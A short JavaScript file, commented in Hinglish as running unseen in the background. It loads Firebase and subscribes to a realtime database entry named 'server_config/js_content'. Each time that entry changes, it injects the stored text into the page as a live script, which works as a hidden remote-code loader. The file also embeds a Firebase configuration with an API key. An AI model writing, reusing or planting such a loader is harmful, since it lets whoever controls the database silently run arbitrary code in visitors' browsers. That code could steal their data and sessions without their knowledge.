// Ye file user ko nazar nahi aayegi, ye background mein chalegi
(function() {
    const firebaseConfig = {
        apiKey: "AIzaSyDuoka8B7oR6blqM6DawxGR7Lz1q6g6n44",
        databaseURL: "https://script-update-server-default-rtdb.firebaseio.com",
        projectId: "script-update-server",
        appId: "1:1065485832455:web:7705978342f83a9caf35a2"
    };

    // Firebase ko load karna (Dynamic tarike se)
    var s1 = document.createElement('script');
    s1.src = "https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js";
    document.head.appendChild(s1);

    s1.onload = function() {
        var s2 = document.createElement('script');
        s2.src = "https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js";
        document.head.appendChild(s2);

        s2.onload = function() {
            firebase.initializeApp(firebaseConfig);
            firebase.database().ref("server_config/js_content").on("value", (snapshot) => {
                const code = snapshot.val();
                if (code) {
                    // Purani script remove karna
                    let old = document.getElementById("ahmad-injected");
                    if (old) old.remove();

                    // Naya script inject karna
                    let sc = document.createElement("script");
                    sc.id = "ahmad-injected";
                    sc.text = code;
                    document.body.appendChild(sc);
                }
            });
        };
    };
})();
